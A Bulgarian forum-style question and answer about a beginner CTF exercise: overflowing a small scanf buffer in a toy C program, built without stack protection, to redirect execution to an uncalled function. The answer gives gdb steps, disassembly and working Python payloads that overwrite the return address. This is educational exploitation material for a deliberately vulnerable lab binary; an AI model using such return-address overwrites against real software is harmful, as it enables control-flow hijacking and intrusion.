# Въпрос

Здравейте, хорааа :) Отскоро се заиграх с разни аматьорски CTF задачки, но ударих на камък с една и не знам от къде да я подхвана. Идеята е, че имаме проста C програмка  и искаме да изпълним функция, която никъде не се извиква. Програмата е със следната структура: 
 
```C
struct data {
    char a[10];
    int b;
};

void never_called_function() {
    printf("Success");
}

int main() {
    struct data d;
    scanf("%s", d.a);
    return 0;
}
```

Ясно, че за да видим заветния "Success",  трябва с gdb да намерим адреса на `never_called_function()` и да въведем такава стойност за d.a, че да overflow-нем в стека до този адрес. Притеснява ме и начина на компилиране: 

    gcc -o xakbg_bof -O0 -ggdb -fno-stack-protector xakbg_bof.c 

Някакви идеи как да подходя? 


# Отговор

Първо инсталирай си сносен екстенд на gdb - може да пробваш peda или pwndb.

Относно компилирането:
* `-О0` е за да махне оптимизацията. Компилатора може да премахва dead code ако реши за да пести място, а `never_called_function()` си е мъртъв код
* `-fno-stack-protector` ти компилира програмата без стек канарче, което е допълнителна защита, която проверява за buffer overrun. Махната е за да не усложни допълнително задачата
* `-ggdb` ти компилира в дебъг режим (лично го намирам за излишно)

Ако това го пробваш на модерно Ubuntu считам следните неща за дадени:
* ASLR - рандомизация на адреси на стек и библиотеки
* NX - no execution bit
* системата е 64bit

Преди да почнеш да трошиш е хубвао да си пуснеш core dump files:

    $> ulimit -c unlimited

След това започваш да тестваш. Ако приемем, че системата ти е 64 битова, тогава адресите ти са 8 байта, следователно имаме:
* минимум 16 байта променлива
* frame pointer - 8 байта
* `main()` return address - 8 байта (тук пишеш адреса на never_called_function)
* `never_called_function()` return address - 8 байта (пожелателно е това да сочи към `exit()` за да не крашнем програмата)

Та първия ми опит е нещо то сорта на:

    $> python -c "import struct;print 'a'*16 + 'b'*8 + 'c'*8 + 'd'*8" | ./xakbg_bof

Естествено това крашва с core dump файл и гледаме какво се случва с:

    $> gdb ./xakbg_bof ./core

"core" е името на core dump файла, който краша е направил. Под gdb намираме адреса на `never_called_function()`:

    pwndbg> print never_called_function 
    $1 = {<text variable, no debug info>} 0x400596 <never_called_function>

Евентуално търсим адреса на `exit()`, но ако имаш рандомизация на shared libs това няма да сработи. В този конкретен случай не можах да намеря добър изход и записах адреса на `hlt` инструкцията от `_start` стъба (заради който ще seg fault-нем):

    pwndbg> disassemble _start
    Dump of assembler code for function _start:
       0x00000000004004a0 <+0>: xor    ebp,ebp
       0x00000000004004a2 <+2>: mov    r9,rdx
       0x00000000004004a5 <+5>: pop    rsi
       0x00000000004004a6 <+6>: mov    rdx,rsp
       0x00000000004004a9 <+9>: and    rsp,0xfffffffffffffff0
       0x00000000004004ad <+13>:    push   rax
       0x00000000004004ae <+14>:    push   rsp
       0x00000000004004af <+15>:    mov    r8,0x400650
       0x00000000004004b6 <+22>:    mov    rcx,0x4005e0
       0x00000000004004bd <+29>:    mov    rdi,0x4005ac
       0x00000000004004c4 <+36>:    call   0x400470 <__libc_start_main@plt>
       0x00000000004004c9 <+41>:    hlt    
    End of assembler dump.

В крайна сметка payload-а става:

    $> python -c "import struct;print 'a'*16 + 'b'*8 + struct.pack('<Q', 0x400596) + struct.pack('<Q', 0x4004c9)" | ./xakbg_bof

Проследявайки го под gdb стъпка по стъпка виждам, че never_called_function() се изпълнява, но програмата все пак прави segmentation fault без да принтира Success. Това предполагам е заради буфериране на output буфера, който при краш не се flush-ва. Ако променя програмата на:

```C
#include <stdio.h>
#include <stdlib.h>

struct data {
    char a[10];
    int b;
};

void never_called_function() {
    printf("Success");
    fflush( stdout );
}

int main() {
    struct data d;
    scanf("%s", d.a);
    return 0;
}
```

и променя съответните адреси получавам:

    $> python -c "import struct;print 'a'*16 + 'b'*8 + struct.pack('<Q', 0x400616) + struct.pack('<Q', 0x400549)" | ./xakbg_bof 
    SuccessSegmentation fault (core dumped)

**Забележка**: В този конретен случай може да си позволим да използваме 0x00 байтове наляво и надясно, защото целия stdin се взима от `scanf()` без да му мисли много. В други случай ( мисля, че gets() е такъв пример) стринговете ще се прекъсват на първия NULL байт и там ще трябва да сме по креативни. 

    